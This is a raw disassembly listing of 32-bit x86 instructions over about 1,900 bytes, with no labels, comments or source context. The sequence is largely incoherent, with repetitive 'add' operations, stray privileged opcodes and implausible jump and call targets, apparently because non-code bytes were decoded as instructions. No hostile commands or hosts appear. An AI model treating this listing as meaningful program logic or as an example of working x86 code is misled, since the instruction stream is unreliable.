  40468d:	push   ebp
  40468e:	add    esi,DWORD PTR [eax]
  404690:	inc    eax
  404691:	inc    ebx
  404692:	add    BYTE PTR [eax],dl
  404694:	xor    eax,0x50b10
  404699:	add    al,0x4
  40469b:	or     edx,DWORD PTR [ecx+0x6020b18a]
  4046a1:	or     DWORD PTR [eax],0x2a2320a2
  4046a7:	and    BYTE PTR [ecx+0x10],ah
  4046aa:	dec    eax
  4046ab:	ror    al,0x80
  4046ae:	mov    DWORD PTR [ebx+eiz*1],eax
  4046b1:	or     al,BYTE PTR [esi+0x1]
  4046b4:	mov    al,ds:0xd022241
  4046b9:	rcl    BYTE PTR [ebx+0x44000000],0x43
  4046c0:	push   es
  4046c1:	add    al,BYTE PTR [edx+0xc121210]
  4046c7:	adc    eax,DWORD PTR [edi]
  4046c9:	and    BYTE PTR [eax],ah
  4046cb:	nop
  4046cc:	xor    al,BYTE PTR [ebx]
  4046ce:	adc    DWORD PTR [edx],eax
  4046d0:	adc    BYTE PTR [ecx+0x30],0x20
  4046d4:	add    eax,0xe411004d
  4046d9:	add    BYTE PTR [esi],al
  4046db:	add    BYTE PTR [eax],0x1
  4046de:	add    BYTE PTR [esi],al
  4046e0:	inc    eax
  4046e1:	dec    eax
  4046e2:	and    BYTE PTR [eax],al
  4046e4:	inc    esp
  4046e5:	dec    edx
  4046e6:	rol    BYTE PTR [edx+0x58],0xa2
  4046ea:	or     BYTE PTR [eax+0x185000d1],al
  4046f0:	or     eax,eax
  4046f2:	add    al,0x0
  4046f4:	or     BYTE PTR [eax+0x40010b0],al
  4046fa:	adc    BYTE PTR es:[edx+0x6881400c],dl
  404701:	push   eax
  404702:	add    BYTE PTR [ebp-0x6f3debf],cl
  404708:	and    eax,0x20220200
  40470d:	add    al,BYTE PTR [ecx]
  40470f:	dec    eax
  404710:	lds    eax,FWORD PTR [eax+0x9]
  404713:	loop   0x404755
  404715:	inc    eax
  404716:	add    DWORD PTR [ebx+0x0],ebx
  404719:	add    BYTE PTR [eax+0x1],0x0
  40471d:	dec    eax
  40471e:	inc    eax
  40471f:	inc    eax
  404720:	cmp    BYTE PTR [edx],al
  404722:	rol    DWORD PTR [ecx-0x77bfddc6],0x6c
  404729:	add    BYTE PTR [eax+0x100049],al
  40472f:	add    dl,BYTE PTR [ecx]
  404731:	add    BYTE PTR [eax],al
  404733:	and    BYTE PTR [ecx],al
  404735:	add    BYTE PTR [eax-0x80],cl
  404738:	push   eax
  404739:	mov    dl,0x7
  40473b:	mov    DWORD PTR [edx+edx*1],ecx
  40473e:	xor    al,BYTE PTR [ecx-0x5f]
  404741:	add    BYTE PTR [eax-0x5fffe3fa],al
  404747:	add    DWORD PTR [eax-0x70],edi
  40474a:	adc    BYTE PTR [eax],bl
  40474c:	sub    DWORD PTR [eax],esp
  40474e:	mov    al,ds:0x4300
  404753:	and    BYTE PTR [eax+0x0],al
  404756:	adc    BYTE PTR [ecx+0x4c],0x88
  40475a:	inc    eax
  40475b:	add    DWORD PTR [edx-0x3b],eax
  40475e:	add    BYTE PTR [eax],bl
  404760:	adc    BYTE PTR [eax+0x38],ch
  404763:	xor    DWORD PTR [edi],eax
  404765:	add    BYTE PTR [eax],al
  404767:	add    eax,0x4840880
  40476c:	rol    DWORD PTR [ecx-0x3fc00000],0x41
  404773:	add    BYTE PTR [edx],al
  404775:	or     BYTE PTR [eax],0x0
  404778:	and    BYTE PTR [edx+0x0],ah
  40477b:	and    BYTE PTR [ecx],cl
  40477d:	add    BYTE PTR [eax],0x0
  404780:	add    BYTE PTR [eax],al
  404782:	or     BYTE PTR [eax],al
  404784:	ret    0x2000
  404787:	add    BYTE PTR [eax],dl
  404789:	add    BYTE PTR [eax+0x20],dh
  40478c:	add    BYTE PTR [eax-0x27],al
  40478f:	adc    DWORD PTR [edx],eax
  404791:	and    BYTE PTR [eax+0x920380],ah
  404797:	add    BYTE PTR [eax],al
  404799:	and    BYTE PTR [edx],al
  40479b:	adc    BYTE PTR [ecx],0x80
  40479e:	mov    al,ds:0x10e40004
  4047a3:	sbb    BYTE PTR [ecx],cl
  4047a5:	add    BYTE PTR [eax+0xa20840],al
  4047ab:	inc    eax
  4047ac:	add    BYTE PTR [eax+0x1a00068],al
  4047b2:	add    cl,BYTE PTR [eax]
  4047b4:	and    al,dh
  4047b6:	add    BYTE PTR [eax],cl
  4047b8:	inc    edx
  4047b9:	add    ah,BYTE PTR [edi-0x3ebdf7e0]
  4047bf:	add    BYTE PTR [eax],ah
  4047c1:	popa   
  4047c2:	add    BYTE PTR [edx],al
  4047c4:	mov    DWORD PTR [eax],ecx
  4047c6:	xchg   esp,esp
  4047c8:	xchg   edx,eax
  4047c9:	add    eax,0x28408014
  4047ce:	add    BYTE PTR [edx+0x210000],al
  4047d4:	and    ah,BYTE PTR [ecx]
  4047d6:	add    BYTE PTR [eax],dh
  4047d8:	add    BYTE PTR [esp+eax*8],0x20
  4047dc:	add    BYTE PTR [eax],al
  4047de:	add    BYTE PTR [edx+0x61080204],ah
  4047e4:	add    BYTE PTR [eax],ah
  4047e6:	add    BYTE PTR [ebp+0x40],ah
  4047e9:	add    al,BYTE PTR [eax]
  4047eb:	add    edx,edx
  4047ed:	inc    eax
  4047ee:	add    al,BYTE PTR [eax+eax*4+0x0]
  4047f2:	inc    ecx
  4047f3:	add    BYTE PTR [eax],al
  4047f5:	inc    ebx
  4047f6:	enter  0x10,0x0
  4047fa:	add    esp,DWORD PTR [edx+0x40c0005d]
  404800:	add    BYTE PTR [eax+0x24],bl
  404803:	add    BYTE PTR [esi+0x604210a8],al
  404809:	add    bl,BYTE PTR [eax]
  40480b:	push   0x3140105c
  404810:	mov    BYTE PTR [eax+eiz*1],cl
  404813:	add    BYTE PTR [ecx+0x26020140],al
  404819:	add    DWORD PTR [edx+ecx*1],esp
  40481c:	or     BYTE PTR [eax],ch
  40481e:	test   BYTE PTR [ebx],al
  404820:	nop
  404821:	and    DWORD PTR [edx+0x3],eax
  404824:	inc    esp
  404825:	or     al,0x29
  404827:	pusha  
  404828:	inc    eax
  404829:	add    BYTE PTR [ecx],al
  40482b:	add    eax,DWORD PTR [eax-0x80]
  40482e:	add    BYTE PTR [eax],ah
  404830:	add    BYTE PTR [edx],al
  404832:	cmp    DWORD PTR [edx],eax
  404834:	inc    ebp
  404835:	add    BYTE PTR [eax],al
  404837:	inc    edx
  404838:	and    al,BYTE PTR [ebp+0x5]
  40483b:	pop    esp
  40483c:	and    BYTE PTR [edx+0x890],0x20
  404843:	adc    DWORD PTR [eax+eax*2+0x0],eax
  404847:	outs   dx,DWORD PTR ds:[esi]
  404848:	push   es
  404849:	jno    0x40486c
  40484b:	add    DWORD PTR [edx],eax
  40484d:	and    BYTE PTR [ecx+esi*1+0x440e5],bl
  404854:	or     al,0x1
  404856:	add    BYTE PTR [eax+0x6],0x3f
  40485a:	and    ecx,DWORD PTR [eax+0x2008200]
  404860:	sub    BYTE PTR [eax],cl
  404862:	add    BYTE PTR [ecx+0x0],al
  404865:	and    al,BYTE PTR es:[ecx+0xa]
  404869:	adc    DWORD PTR [eax+0x21],esi
  40486c:	add    ah,BYTE PTR [edx]
  40486e:	inc    edx
  40486f:	adc    BYTE PTR [edx],al
  404871:	inc    edx
  404872:	add    DWORD PTR [eax+0x3],edx
  404875:	add    DWORD PTR [eax],eax
  404877:	xor    BYTE PTR [eax],al
  404879:	inc    eax
  40487a:	xor    BYTE PTR [eax+0x22],cl
  40487d:	add    BYTE PTR [eax+0x0],bl
  404880:	add    al,0x0
  404882:	or     DWORD PTR [edx],ebx
  404884:	and    BYTE PTR [ecx],al
  404886:	std    
  404887:	add    BYTE PTR [eax],0x0
  40488a:	inc    esp
  40488b:	or     BYTE PTR [ecx],dl
  40488d:	inc    edx
  40488e:	dec    eax
  40488f:	inc    eax
  404890:	push   esp
  404891:	adc    eax,0xe1b81100
  404896:	add    BYTE PTR [ecx],cl
  404898:	and    BYTE PTR [eax+edx*1],0xa5
  40489c:	add    al,BYTE PTR [edx-0x6bbf8fe4]
  4048a2:	test   eax,0x21902248
  4048a7:	add    DWORD PTR [eax],eax
  4048a9:	add    BYTE PTR [eax],al
  4048ab:	add    DWORD PTR [eax+0x78],esp
  4048ae:	add    BYTE PTR [eax],al
  4048b0:	add    BYTE PTR [eax],al
  4048b2:	or     eax,eax
  4048b4:	ins    BYTE PTR es:[edi],dx
  4048b5:	add    BYTE PTR [ebx+0x70],al
  4048b8:	or     al,BYTE PTR [eax+0x40]
  4048bb:	add    al,0x80
  4048bd:	jns    0x4048c0
  4048bf:	add    BYTE PTR [esi+0x852],dl
  4048c5:	add    BYTE PTR [esi],dl
  4048c7:	add    BYTE PTR [eax],bl
  4048c9:	add    cl,BYTE PTR [ebx+0x28]
  4048cc:	inc    ebx
  4048cd:	and    dl,BYTE PTR [ecx-0x7f]
  4048d0:	and    BYTE PTR [eax+eax*1],al
  4048d3:	and    ah,BYTE PTR [eax]
  4048d5:	add    BYTE PTR [eax+0x10],al
  4048d8:	add    al,BYTE PTR [edx-0x7f]
  4048db:	add    BYTE PTR [eax+0x8690222],al
  4048e1:	adc    eax,DWORD PTR [edx+ecx*1-0x7fefdfff]
  4048e8:	inc    eax
  4048e9:	pusha  
  4048ea:	add    BYTE PTR [eax+0x59],al
  4048ed:	imul   esp,DWORD PTR [eax],0x20154000
  4048f3:	add    dl,al
  4048f5:	xchg   BYTE PTR [eax],ah
  4048f7:	sub    al,BYTE PTR [esi]
  4048f9:	adc    BYTE PTR [eax],al
  4048fb:	add    BYTE PTR [eax+0x2000210],al
  404901:	and    BYTE PTR [edx],al
  404903:	add    BYTE PTR [eax+0x0],dh
  404906:	call   0x4c1cbcb
  40490b:	xor    bh,BYTE PTR [esi-0x1ffedffd]
  404911:	add    DWORD PTR [eax+eax*2],esp
  404914:	dec    edx
  404915:	or     BYTE PTR [eax-0x5efdda15],al
  40491b:	or     cl,BYTE PTR [eax]
  40491d:	enter  0x2220,0x0
  404921:	or     BYTE PTR [eax],al
  404923:	add    al,0x10
  404925:	adc    dh,BYTE PTR [ecx-0x80]
  404928:	add    eax,DWORD PTR [eax]
  40492a:	add    ecx,esp
  40492c:	push   es
  40492d:	add    DWORD PTR [eax],eax
  40492f:	add    DWORD PTR [eax],0x8820018
  404935:	inc    esp
  404936:	mov    bl,0x0
  404938:	jle    0x4048f2
  40493a:	add    al,BYTE PTR [eax]
  40493c:	add    BYTE PTR [eax],dl
  40493e:	adc    DWORD PTR [eax+ecx*1+0x404232],edx
  404945:	pusha  
  404946:	inc    eax
  404947:	inc    eax
  404948:	and    cl,BYTE PTR [ecx]
  40494a:	add    BYTE PTR [ecx+0x8000028],al
  404950:	add    ah,BYTE PTR [edi+0x44c80051]
  404956:	add    cl,BYTE PTR [eax+eiz*1+0x0]
  40495a:	adc    BYTE PTR [eax],dl
  40495c:	sub    DWORD PTR [eax],eax
  40495e:	add    DWORD PTR [eax],eax
  404960:	mov    al,ds:0x403148
  404965:	push   eax
  404966:	or     BYTE PTR [eax+0x1e100120],bl
  40496c:	add    al,BYTE PTR [eax+0x2]
  40496f:	aam    0x8
  404971:	or     BYTE PTR [eax+0xc],al
  404974:	rol    BYTE PTR [eax],cl
  404976:	call   0x250ca1b
  40497b:	or     bl,al
  40497d:	add    BYTE PTR [eax],al
  40497f:	add    al,ah
  404981:	dec    eax
  404982:	add    BYTE PTR [eax],al
  404984:	popa   
  404985:	add    BYTE PTR [eax],ah
  404987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404988:	add    ah,BYTE PTR [edx+eax*4]
  40498b:	add    al,0x44
  40498d:	add    esp,DWORD PTR es:[eax]
  404990:	add    BYTE PTR [eax],al
  404992:	mov    al,ds:0xc30f1820
  404997:	sub    BYTE PTR [eax],al
  404999:	add    BYTE PTR [eax+0x1],cl
  40499c:	or     DWORD PTR [eax],ebx
  40499e:	add    BYTE PTR [eax+eax*8],ah
  4049a1:	add    al,BYTE PTR [edx]
  4049a3:	add    BYTE PTR [edx+0x2a],ch
  4049a6:	dec    esp
  4049a7:	or     BYTE PTR [eax+0x21],cl
  4049aa:	add    dl,al
  4049ac:	add    BYTE PTR [eax],0x1
  4049af:	and    al,0x90
  4049b1:	and    dl,BYTE PTR [eax]
  4049b3:	add    al,BYTE PTR [edx]
  4049b5:	fnstsw WORD PTR [ecx+0x45208041]
  4049bb:	loope  0x4049f6
  4049bd:	and    BYTE PTR [eax+eiz*1+0x4],al
  4049c1:	or     esp,DWORD PTR [eax]
  4049c3:	lods   al,BYTE PTR ds:[esi]
  4049c4:	or     BYTE PTR [eax],al
  4049c6:	add    BYTE PTR [eax+0x388000],al
  4049cc:	xor    BYTE PTR [eax],ah
  4049ce:	inc    ebx
  4049cf:	add    DWORD PTR [eax-0x7c],0xa00020
  4049d6:	inc    eax
  4049d7:	adc    BYTE PTR [edx+edx*1],0x40
  4049db:	add    BYTE PTR [eax],al
  4049dd:	add    BYTE PTR [ecx],cl
  4049df:	add    BYTE PTR [ecx-0x7ffbfe00],ch
  4049e5:	inc    eax
  4049e6:	add    BYTE PTR [eax],al
  4049e8:	adc    BYTE PTR [ecx],ah
  4049ea:	popa   
  4049eb:	and    al,BYTE PTR [eax]
  4049ed:	add    BYTE PTR [ecx],cl
  4049ef:	mov    dl,BYTE PTR [eax+0x12110800]
  4049f5:	and    eax,0x80041941
  4049fa:	add    BYTE PTR [eax+eax*1-0x7c],al
  4049fe:	inc    esp
  4049ff:	adc    BYTE PTR [eax],al
  404a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a02:	and    eax,DWORD PTR [eax+0x4400024]
  404a08:	and    BYTE PTR [eax],al
  404a0a:	enter  0x9,0x50
  404a0e:	add    BYTE PTR ds:0x85711088,0x1
  404a15:	js     0x404a19
  404a17:	adc    BYTE PTR [eax+0x40834060],al
  404a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a1e:	and    al,0x28
  404a20:	add    BYTE PTR [eax],ah
  404a22:	add    BYTE PTR [eax+0x40],al
  404a25:	add    BYTE PTR [eax],al
  404a27:	or     BYTE PTR [eax+0x0],dl
  404a2a:	add    BYTE PTR [ecx+0x1820f202],al
  404a30:	add    BYTE PTR [edx+0x1232001],bl
  404a36:	add    DWORD PTR [eax],edx
  404a38:	add    BYTE PTR [eax],al
  404a3a:	sbb    BYTE PTR [eax],al
  404a3c:	or     cl,BYTE PTR [eax-0x70]
  404a3f:	add    BYTE PTR [eax+eax*1],ah
  404a42:	mov    BYTE PTR [eax],cl
  404a44:	sbb    al,0x5a
  404a46:	adc    BYTE PTR [eax+0x41],al
  404a49:	add    dl,BYTE PTR [eax+eax*1]
  404a4c:	add    BYTE PTR [ecx],al
  404a4e:	add    al,al
  404a50:	mov    ch,BYTE PTR [eax]
  404a52:	add    BYTE PTR [eax+eiz*1],cl
  404a55:	inc    eax
  404a56:	adc    cl,BYTE PTR [eax]
  404a58:	adc    BYTE PTR [eax],cl
  404a5a:	add    esi,DWORD PTR [eax+0xc]
  404a5d:	adc    BYTE PTR [edx],0x40
  404a60:	add    BYTE PTR [eax],dl
  404a62:	or     DWORD PTR [eax+0x2],ebp
  404a65:	inc    edx
  404a66:	jo     0x404a0a
  404a68:	xchg   BYTE PTR [eax+0x8ac9808],dl
  404a6e:	or     eax,edx
  404a70:	inc    eax
  404a71:	or     BYTE PTR [eax],al
  404a73:	inc    edx
  404a74:	or     BYTE PTR [esp+esi*1+0x0],dl
  404a78:	add    BYTE PTR [eax+0x0],0x0
  404a7c:	add    BYTE PTR [eax],ah
  404a7e:	inc    ecx
  404a7f:	dec    eax
  404a80:	pusha  
  404a81:	add    DWORD PTR [edx],esp
  404a83:	inc    edx
  404a84:	sub    al,0x61
  404a86:	adc    BYTE PTR ds:0x48614500,ch
  404a8c:	and    BYTE PTR [eax],al
  404a8e:	add    BYTE PTR [eax],dl
  404a90:	mov    ds:0xe8805a24,eax
  404a95:	sub    BYTE PTR [eax+eiz*1],cl
  404a98:	add    BYTE PTR [edx],al
  404a9a:	add    al,BYTE PTR [edx]
  404a9c:	and    al,0x0
  404a9e:	add    BYTE PTR [eax+eax*1],al
  404aa1:	add    BYTE PTR [edx+0x9],al
  404aa4:	add    DWORD PTR [eax+0x20000421],eax
  404aaa:	add    al,0x40
  404aac:	sub    BYTE PTR [eax],dl
  404aae:	inc    esp
  404aaf:	xor    BYTE PTR [edx],al
  404ab1:	mov    al,ds:0x14020891
  404ab6:	or     al,BYTE PTR [eax+eax*2]
  404ab9:	or     BYTE PTR [eax],bl
  404abb:	inc    eax
  404abc:	add    BYTE PTR [eax],cl
  404abe:	add    BYTE PTR [edx],al
  404ac0:	add    al,0x0
  404ac2:	sub    DWORD PTR fs:[eax+0x0],esp
  404ac6:	or     ecx,DWORD PTR [eax]
  404ac8:	add    al,al
  404aca:	add    BYTE PTR [edx+0x402000a0],dh
  404ad0:	add    BYTE PTR [eax+ecx*1],al
  404ad3:	adc    BYTE PTR ds:0x801021,dl
  404ad9:	or     BYTE PTR [eax+0x500c002],ah
  404adf:	adc    al,al
  404ae1:	pop    eax
  404ae2:	adc    al,al
  404ae4:	inc    eax
  404ae5:	add    ah,BYTE PTR [ecx]
  404ae7:	mov    DWORD PTR [eax],eax
  404ae9:	inc    esp
  404aea:	and    BYTE PTR [ebx],dl
  404aec:	inc    eax
  404aed:	add    BYTE PTR [eax+0x0],al
  404af0:	add    BYTE PTR [eax+0x61],al
  404af3:	inc    ebx
  404af4:	add    dl,BYTE PTR [eax]
  404af6:	add    DWORD PTR [eax],eax
  404af8:	add    al,0xa
  404afa:	or     BYTE PTR [eax],dl
  404afc:	add    DWORD PTR [eax],ebp
  404afe:	sbb    BYTE PTR [eax],al
  404b00:	adc    al,0x40
  404b02:	add    BYTE PTR [ecx+0x18],ah
  404b05:	add    BYTE PTR [eax],cl
  404b07:	add    BYTE PTR [eax],al
  404b09:	add    DWORD PTR [eax],0x10930000
  404b0f:	sub    BYTE PTR [edx],cl
  404b11:	and    al,0x0
  404b13:	dec    esi
  404b14:	or     BYTE PTR [ebp+0x4],ah
  404b17:	pusha  
  404b18:	dec    edx
  404b19:	cmp    BYTE PTR [edx-0x7c],ah
  404b1c:	push   edx
  404b1d:	add    al,BYTE PTR [eax]
  404b1f:	add    BYTE PTR [esi-0x7ffbdfc0],0x10
  404b26:	or     al,BYTE PTR [eax+eax*1]
  404b29:	pusha  
  404b2a:	add    BYTE PTR [ebp+0x26],cl
  404b2d:	or     BYTE PTR [edx],cl
  404b2f:	inc    edx
  404b30:	sub    BYTE PTR [edi+ecx*2],al
  404b33:	sub    al,BYTE PTR [eax+0x4b]
  404b36:	add    BYTE PTR [ebx+0x40452221],al
  404b3c:	add    BYTE PTR [ecx],al
  404b3e:	and    al,0x40
  404b40:	or     BYTE PTR [eax],al
  404b42:	mov    eax,ds:0x24030002
  404b47:	add    BYTE PTR [eax],al
  404b49:	adc    BYTE PTR [ebx+0x8325431],ah
  404b4f:	add    BYTE PTR [eax],al
  404b51:	nop
  404b52:	dec    eax
  404b53:	push   eax
  404b54:	bound  eax,QWORD PTR [esi]
  404b56:	add    BYTE PTR [eax],al
  404b58:	push   eax
  404b59:	add    al,0x68
  404b5b:	add    BYTE PTR [ecx+0x30],al
  404b5e:	adc    BYTE PTR [eax],al
  404b60:	or     BYTE PTR [eax],al
  404b62:	add    al,BYTE PTR [eax]
  404b64:	add    DWORD PTR [eax],0xc02c4000
  404b6a:	and    BYTE PTR [ecx],0x0
  404b6d:	loopne 0x404b81
  404b6f:	adc    BYTE PTR [eax],al
  404b71:	xor    al,0x24
  404b73:	add    DWORD PTR [edx],eax
  404b75:	mov    dl,BYTE PTR [eax+0x0]
  404b78:	add    BYTE PTR [eax+eax*1],0x94
  404b7c:	shl    BYTE PTR [eax],0x21
  404b7f:	xor    al,0x30
  404b81:	adc    al,0x0
  404b83:	add    al,0x9e
  404b85:	add    DWORD PTR [eax],ecx
  404b87:	pop    ax
  404b89:	dec    edi
  404b8a:	xchg   ecx,eax
  404b8b:	sub    dh,al
  404b8d:	add    BYTE PTR [eax],al
  404b8f:	add    BYTE PTR [ecx],al
  404b91:	add    BYTE PTR [eax],dl
  404b93:	enter  0x8588,0x20
  404b97:	or     DWORD PTR [eax],edx
  404b99:	add    BYTE PTR [eax+0x200e11c],al
  404b9f:	add    BYTE PTR [ecx],0x0
  404ba2:	add    BYTE PTR [eax],cl
  404ba4:	inc    ebx
  404ba5:	inc    ecx
  404ba6:	inc    edi
  404ba7:	push   edx
  404ba8:	mov    WORD PTR [ebx-0x78],es
  404bab:	adc    BYTE PTR [eax],bl
  404bad:	or     BYTE PTR [edx+eax*2],al
  404bb0:	mov    al,0x1
  404bb2:	xchg   esp,eax
  404bb3:	dec    eax
  404bb4:	mov    al,ds:0x41440804
  404bb9:	inc    edx
  404bba:	les    edx,FWORD PTR [ecx]
  404bbc:	or     BYTE PTR [ebx],al
  404bbe:	cmp    BYTE PTR [ebx+0x0],0x1
  404bc2:	push   cs
  404bc3:	test   BYTE PTR [eax+0x40],cl
  404bc6:	mov    es,WORD PTR [edx-0x7e]
  404bc9:	add    al,0x0
  404bcb:	mov    al,BYTE PTR [ecx]
  404bcd:	inc    eax
  404bce:	pop    es
  404bcf:	add    BYTE PTR [eax],ah
  404bd1:	xor    BYTE PTR [eax+0x40],al
  404bd4:	or     BYTE PTR [eax+0x221200],al
  404bda:	pushf  
  404bdb:	adc    BYTE PTR [ecx],al
  404bdd:	add    DWORD PTR [eax+0x0],0x2
  404be1:	add    DWORD PTR [edx],eax
  404be3:	add    BYTE PTR [ebx],al
  404be5:	icebp  
  404be6:	adc    BYTE PTR [eax],dl
  404be8:	sub    al,0x28
  404bea:	pop    esp
  404beb:	add    BYTE PTR [eax],dl
  404bed:	adc    al,0x55
  404bef:	add    BYTE PTR [eax+0x0],ch
  404bf2:	add    BYTE PTR [eax+0x405014],al
  404bf8:	add    eax,DWORD PTR ds:0x12410267
  404bfe:	inc    edi
  404bff:	mov    al,ds:0x9000800
  404c04:	pusha  
  404c05:	add    DWORD PTR [eax-0x6e],ebp
  404c08:	in     al,0xd3
  404c0a:	add    BYTE PTR [esi-0x80],dl
  404c0d:	add    BYTE PTR [edx],al
  404c0f:	inc    eax
  404c10:	push   esp
  404c11:	inc    eax
  404c12:	or     BYTE PTR [eax+ecx*8],al
  404c15:	inc    eax
  404c16:	add    BYTE PTR ds:0x4478002e,cl
  404c1c:	adc    ah,BYTE PTR [eax-0x7c]
  404c1f:	inc    eax
  404c20:	add    al,BYTE PTR [edx]
  404c22:	adc    DWORD PTR [edx-0x7e],eax
  404c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c26:	sbb    BYTE PTR [esi-0x28],bl
  404c29:	add    BYTE PTR [eax],0x40
  404c2c:	add    BYTE PTR [eax+0x1],al
  404c2f:	and    al,0x40
  404c31:	add    al,BYTE PTR [eax+0x0]
  404c34:	and    DWORD PTR [eax],eax
  404c36:	or     BYTE PTR [eax],cl
  404c38:	add    BYTE PTR [eax+0x3],al
  404c3b:	push   edx
  404c3c:	enter  0x702,0x89
  404c40:	inc    eax
  404c41:	or     al,0x0
  404c43:	add    BYTE PTR [eax+eax*1+0x43808],al
  404c4a:	popa   
  404c4b:	add    eax,0xd0a0
  404c50:	add    eax,0x4000
  404c55:	rol    BYTE PTR [eax+0x55],1
  404c58:	or     BYTE PTR [eax],al
  404c5a:	add    BYTE PTR [eax],al
  404c5c:	add    BYTE PTR [eax],0x21
  404c5f:	and    al,0x86
  404c61:	or     al,0x30
  404c63:	and    eax,DWORD PTR [eax+0x40010505]
  404c69:	add    BYTE PTR [eax],dl
  404c6b:	dec    esp
  404c6c:	add    al,0x10
  404c6e:	add    BYTE PTR [edx],al
  404c70:	sub    al,dl
  404c72:	and    BYTE PTR [edx+0x44000220],dh
  404c78:	add    BYTE PTR [edx],cl
  404c7a:	add    BYTE PTR [eax],al
  404c7c:	mov    BYTE PTR [eax+0x20023523],ah
  404c82:	add    DWORD PTR [eax],eax
  404c84:	adc    BYTE PTR [eax],al
  404c86:	or     BYTE PTR [eax],0x80
  404c89:	xchg   BYTE PTR [edx],bh
  404c8b:	add    BYTE PTR [ebx],dl
  404c8d:	add    BYTE PTR [eax],cl
  404c8f:	push   eax
  404c90:	inc    eax
  404c91:	add    BYTE PTR [eax],0x8b
  404c94:	adc    al,0x48
  404c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c97:	ds dec esp
  404c99:	add    al,al
  404c9b:	or     BYTE PTR [eax],al
  404c9d:	add    DWORD PTR [esi],eax
  404c9f:	add    eax,0x8040200
  404ca4:	add    DWORD PTR [eax],edx
  404ca6:	inc    eax
  404ca7:	cdq    
  404ca8:	push   eax
  404ca9:	shr    BYTE PTR [eax],0x20
  404cac:	xchg   ecx,eax
  404cad:	inc    esi
  404cae:	and    DWORD PTR gs:[eax],edx
  404cb1:	add    DWORD PTR [eax],ecx
  404cb3:	inc    eax
  404cb4:	cmp    BYTE PTR [edx],dl
  404cb6:	sub    BYTE PTR [eax],al
  404cb8:	or     dl,BYTE PTR [eax-0x7f]
  404cbb:	sbb    BYTE PTR [edx],al
  404cbd:	and    al,0x80
  404cbf:	test   BYTE PTR [eax+eax*1],al
  404cc2:	add    al,0x49
  404cc4:	enter  0x205,0x20
  404cc8:	or     al,0x0
  404cca:	ret    
  404ccb:	and    al,0x0
  404ccd:	add    BYTE PTR [edx],al
  404ccf:	add    BYTE PTR [edx],al
  404cd1:	mov    DWORD PTR [eax+0x0],edx
  404cd4:	inc    ebx
  404cd5:	adc    BYTE PTR [ecx],al
  404cd7:	add    al,0x0
  404cd9:	adc    al,BYTE PTR [eax+0x204280]
  404cdf:	sbb    BYTE PTR [eax],ah
  404ce1:	or     BYTE PTR [edx+eiz*1],ah
  404ce4:	in     al,0xc0
  404ce6:	add    DWORD PTR [ecx+edx*1],0x4001072
  404ced:	ins    BYTE PTR es:[edi],dx
  404cee:	adc    dl,BYTE PTR [ecx]
  404cf0:	add    ch,BYTE PTR [edi+0x10120010]
  404cf6:	add    DWORD PTR [eax],eax
  404cf8:	or     BYTE PTR [eax+0x40084308],al
  404cfe:	add    al,0x9
  404d00:	or     BYTE PTR [eax-0x56f7b6fe],ah
  404d06:	add    BYTE PTR [eax],cl
  404d08:	add    BYTE PTR [eax],ah
  404d0a:	rol    BYTE PTR [eax],1
  404d0c:	or     DWORD PTR [eax],eax
  404d0e:	or     BYTE PTR [eax],al
  404d10:	jno    0x404d12
  404d12:	and    DWORD PTR [eax+0x12],edx
  404d15:	add    BYTE PTR [eax],al
  404d17:	adc    BYTE PTR [eax+eax*1],dl
  404d1a:	stos   DWORD PTR es:[edi],eax
  404d1b:	adc    BYTE PTR [eax+ebx*4],al
  404d1e:	add    ah,al
  404d20:	push   es
  404d21:	add    BYTE PTR [ecx+ecx*2-0x80],al
  404d25:	test   BYTE PTR [eax],al
  404d27:	add    DWORD PTR [eax+0x40180448],0x81823d40
  404d31:	sub    BYTE PTR [edx+0x265009c6],0x44
  404d38:	inc    eax
  404d39:	add    BYTE PTR [edx],cl
  404d3b:	inc    eax
  404d3c:	add    cl,BYTE PTR [eax+eax*1]
  404d3f:	add    al,bl
  404d41:	add    al,BYTE PTR [eax]
  404d43:	and    BYTE PTR [eax],0x40
  404d46:	jo     0x404d2a
  404d48:	cs rol BYTE PTR es:[eax],0x46
  404d4d:	add    al,BYTE PTR [ecx-0x7ffffeef]
  404d53:	add    BYTE PTR [eax],al
  404d55:	or     BYTE PTR [eax],al
  404d57:	adc    eax,0x80022072
  404d5c:	or     BYTE PTR [eax],bl
  404d5e:	add    BYTE PTR ds:0x18228203,bl
  404d64:	add    BYTE PTR [edx],dh
  404d66:	lds    edx,FWORD PTR [edx]
  404d68:	or     al,BYTE PTR [eax]
  404d6a:	or     BYTE PTR [ecx],al
  404d6c:	or     DWORD PTR [edx],eax
  404d6e:	or     al,0x20
  404d70:	and    al,0x10
  404d72:	add    BYTE PTR [eax],dl
  404d74:	inc    eax
  404d75:	add    BYTE PTR [eax+eax*1+0x5],ch
  404d79:	and    DWORD PTR [eax],eax
  404d7b:	or     eax,DWORD PTR [eax]
  404d7d:	adc    DWORD PTR [ecx],eax
  404d7f:	add    BYTE PTR [ebx+0x9],dl
  404d82:	add    BYTE PTR [eax],al
  404d84:	and    BYTE PTR [eax],al
  404d86:	add    BYTE PTR [edx],0x7
  404d89:	and    BYTE PTR [eax],al
  404d8b:	add    BYTE PTR [edx],al
  404d8d:	add    BYTE PTR [eiz*1+0x120940],al
  404d94:	inc    ecx
  404d95:	add    BYTE PTR [eax],al
  404d97:	inc    eax
  404d98:	adc    al,0x40
  404d9a:	and    al,0x0
  404d9c:	sbb    BYTE PTR [eax+0xa],0x1
  404da0:	jo     0x404dad
  404da2:	inc    eax
  404da3:	or     al,BYTE PTR [ecx]
  404da5:	add    BYTE PTR [eax],al
  404da7:	and    bl,BYTE PTR [eax+0x0]
  404daa:	add    BYTE PTR [eax+0x8],ah
  404dad:	add    DWORD PTR [eax+0x0],0x82020400
  404db4:	add    BYTE PTR ds:0x18120004,0xa0
  404dbb:	push   eax
  404dbc:	add    BYTE PTR [eax-0x74],al
  404dbf:	add    DWORD PTR [eax],ecx
  404dc1:	cwde   
  404dc2:	add    dh,BYTE PTR [esi-0x6fbeffff]
  404dc8:	rol    DWORD PTR [edx+0x4211902],cl
  404dce:	add    BYTE PTR [eax],al
  404dd0:	adc    BYTE PTR [eax],0x10
  404dd3:	xor    al,BYTE PTR [eax+0x40806060]
  404dd9:	add    BYTE PTR [eax+eax*2+0x864060],cl
  404de0:	dec    eax
  404de1:	inc    eax
